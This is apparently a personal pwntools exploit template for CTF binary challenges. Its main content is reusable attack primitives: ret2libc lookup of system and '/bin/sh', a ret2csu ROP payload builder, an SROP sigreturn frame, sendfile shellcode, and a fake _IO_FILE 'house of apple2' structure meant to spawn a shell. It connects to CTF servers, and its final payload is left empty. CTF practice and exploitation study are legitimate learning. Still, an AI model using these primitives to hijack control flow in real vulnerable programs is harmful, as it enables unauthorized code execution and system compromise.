from pwn import *
from ctypes import *
# from LibcSearcher import *
# from pwnlib.dynelf import ctypes
# from pwnlib.fmtstr import make_atoms_simple

context(arch="amd64", os="linux", log_level="debug")
# Now no need tmux !
# context.terminal = ["tmux", "split", "-h"]
context.terminal = ["kitty"]
binary_path = "./"
libc_path = "/home/NazrinDuck/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so"
ld_path = "/home/NazrinDuck/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so"

rop = ROP(binary_path)
elf = ELF(binary_path)

libc = ELF(libc_path)
libc_dll = cdll.LoadLibrary(libc_path)


local = 0

ip, port = "61.147.171.105", 29144
# ip, port = "chall.pwnable.tw", 1
if local == 0:
    p = process(binary_path)
    def dbg(p): return gdb.attach(p)
else:
    p = remote(ip, port)
    # p = remote("pwn.challenge.ctf.show",port)
    # p = remote("node5.buuoj.cn", port)
    def dbg(_): return None


def ls(addr): return log.success(hex(addr))
def recv(char): return u64(p.recvuntil(char, drop=True).ljust(8, b"\0"))


sendfile = """
xchg rsi, rax;
xor rdi, rdi;
inc rdi;
push 0;
mov rdx, rsp;
push 0x50;
pop r10;
push 40;
pop rax;
syscall;
"""


"""
def search(func_name: str, func_addr: int):
    log.success(func_name + ": " + hex(func_addr))
    libc = LibcSearcher(func_name, func_addr)
    offset = func_addr - libc.dump(func_name)
    binsh = offset + libc.dump("str_bin_sh")
    system = offset + libc.dump("system")
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)
"""


def search_from_libc(func_name: str, func_addr: int, libc=libc):
    log.success(func_name + ": " + hex(func_addr))
    offset = func_addr - libc.symbols[func_name]
    binsh = offset + libc.search(b"/bin/sh").__next__()
    system = offset + libc.symbols["system"]
    log.success("offset: " + hex(offset))
    return (system, binsh)


csu_start = 0x0


def csu(edi=0, rsi=0, rdx=0, r12=0, start=csu_start, mode=0):
    end = start + 0x1A
    payload = p64(end)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    if mode == 0:
        payload += p64(r12)  # r12
        payload += p64(edi)  # edi
        payload += p64(rsi)  # rsi
        payload += p64(rdx)  # rdx
    else:
        payload += p64(edi)  # r12
        payload += p64(rsi)  # edi
        payload += p64(rdx)  # rsi
        payload += p64(r12)  # rdx
    payload += p64(start)
    payload += b"a" * 56
    return payload


def sig(rax=0, rdi=0, rsi=0, rdx=0, rsp=0, rip=0):
    sigframe = SigreturnFrame()
    sigframe.rax = rax
    sigframe.rdi = rdi  # "/bin/sh" 's addr
    sigframe.rsi = rsi
    sigframe.rdx = rdx
    sigframe.rsp = rsp
    sigframe.rip = rip
    return bytes(sigframe)


def io_file(flag, read_ptr, read_end, wdata, mode, vtable):
    return flat(
        {
            0x0: flag,
            0x8: p64(read_ptr),
            0x10: p64(read_end),
            0xA0: p64(wdata),
            0xC0: p64(mode),
            0xD8: p64(vtable),
        },
        filler=b"\x00",
    )


"""
amd64：
 
0x0:'_flags',
0x8:'_IO_read_ptr',
0x10:'_IO_read_end',
0x18:'_IO_read_base',
0x20:'_IO_write_base',
0x28:'_IO_write_ptr',
0x30:'_IO_write_end',
0x38:'_IO_buf_base',
0x40:'_IO_buf_end',
0x48:'_IO_save_base',
0x50:'_IO_backup_base',
0x58:'_IO_save_end',
0x60:'_markers',
0x68:'_chain',
0x70:'_fileno',
0x74:'_flags2',
0x78:'_old_offset',
0x80:'_cur_column',
0x82:'_vtable_offset',
0x83:'_shortbuf',
0x88:'_lock',
0x90:'_offset',
0x98:'_codecvt',
0xa0:'_wide_data',
0xa8:'_freeres_list',
0xb0:'_freeres_buf',
0xb8:'__pad5',
0xc0:'_mode',
0xc4:'_unused2',
0xd8:'vtable'
"""


def house_of_apple2(_IO_wfile_overflow, base_addr, func):
    # must set mode=1 when use stderr
    fake_io = flat(
        {
            0x0: b"  sh;",
            0xA0: p64(base_addr + 0xE0),
            0xD8: p64(_IO_wfile_overflow - 0x18),
        },
        filler=b"\x00",
    )
    fake_wdata = flat(
        {
            0x18: p64(0),  # _IO_write_base
            0x30: p64(0),  # _IO_buf_base
            0xE0: p64(base_addr + 0x1D0) + p64(0),  # padding
        },
        filler=b"\x00",
    )
    fake_wvtable = flat(
        {
            0x68: p64(func),
        },
        filler=b"\x00",
    )
    """
    b _IO_wdoallocbuf
    assert len == 0x240
    """
    return fake_io + fake_wdata + fake_wvtable


# =================start=================#

dbg(p)
payload = b""
p.send(payload)

p.interactive()
